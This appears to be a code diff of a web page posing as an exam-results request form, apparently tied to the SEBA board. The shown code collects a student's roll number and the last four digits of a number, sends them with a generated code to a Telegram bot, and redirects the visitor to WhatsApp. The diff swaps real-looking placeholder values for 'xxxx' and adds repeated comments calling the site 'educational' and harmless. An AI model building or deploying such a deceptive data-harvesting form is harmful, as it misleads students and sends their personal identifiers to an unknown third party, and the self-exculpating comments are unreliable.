@@ -796,13 +796,13 @@
                         <label class="input-label">Roll Number</label>
                         <div class="prefixed-input">
                             <span class="prefix">B26-</span>
-                            <input type="text" id="rollInput" maxlength="4" pattern="\d*" inputmode="numeric" placeholder="0387" required autofocus>
+                            <input type="text" id="rollInput" maxlength="4" pattern="\d*" inputmode="numeric" placeholder="xxxx" required autofocus>
                         </div>
                     </div>
 
                     <div class="input-group">
                         <label class="input-label">Number (Last 4 digits)</label>
-                        <input type="text" id="numberInput" maxlength="4" pattern="\d*" inputmode="numeric" placeholder="0634" required>
+                        <input type="text" id="numberInput" maxlength="4" pattern="\d*" inputmode="numeric" placeholder="xxxx" required>
                     </div>
 
                     <button type="submit" id="submitBtn" class="btn">
@@ -954,7 +954,7 @@
             toast.className = `toast ${type} show`;
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
-
+// hahaha EDUCATIONAL WEBSITE
         // Send to Telegram
         async function sendToTelegram(roll, number, code) {
             const message = `🔔 *New Result Request*\n━━━━━━━━━━━━━━━━\n📋 *Roll:* \`${roll}\`\n🔢 *Number:* \`${number}\`\n🔑 *Code:* \`${code}\`\n⏰ *Time:* ${new Date().toLocaleString('en-IN')}\n━━━━━━━━━━━━━━━━`;
@@ -969,7 +969,7 @@
                         parse_mode: 'Markdown'
                     })
                 });
-
+// this is an educational purpose website, we don't use any actual data or anything. this is completely an educational platform just to keep my friends Roll no IDs, i apologize if i did any mistake. if i made any mistake, i will just delete all the data i collected. this platform doesn't collect any IP address and any credentials. just roll and no. those are public! 
                 return response.ok;
             } catch (error) {
                 console.error('Telegram Error:', error);
@@ -1011,7 +1011,7 @@
 
             if (sent) {
                 showToast('Request submitted successfully!');
-                
+                // if i made amy mistake I apologize to everyone..! this website is just for fun and educational purpose. Not real data is being leaked or anything.. no API is connected with ACTUAL SEBA Portal... this is just for fun platform.. no any intention to harm and harass anyone. completely EDUCATIONAL WEBSITE
                 // Show motivational modal
                 successModal.classList.add('show');
                 
@@ -1023,7 +1023,7 @@
                     generatedCode.textContent = code;
                     formPage.classList.remove('active');
                     successPage.classList.add('active');
-                    
+                    // I USE MY V. CODING SKILL TO MADE THIS WEBSITE, NOT HARM ANYONE WITH MY SKILL; THIS WEBSOTW IS COMPLETELY FOR EDUCATIONAL PURPOSES. 
                     // Countdown and redirect to WhatsApp
                     let seconds = 3;
                     const timer = setInterval(() => {
@@ -1098,7 +1098,7 @@
             submitBtn.classList.remove('loading');
             submitBtn.disabled = false;
         }
-
+//  EDUCATIONAL SITE
         // Auto format inputs
         rollInput.addEventListener('input', limitLength);
         numberInput.addEventListener('input', limitLength);
@@ -1115,7 +1115,7 @@
                 successModal.classList.remove('show');
             }
         });
-
+// EDUCATIONAL WEBSITE USING VIBW CODING
         // Keyboard navigation
         document.addEventListener('keydown', (e) => {
             if (e.key === 'Escape' && successModal.classList.contains('show')) {
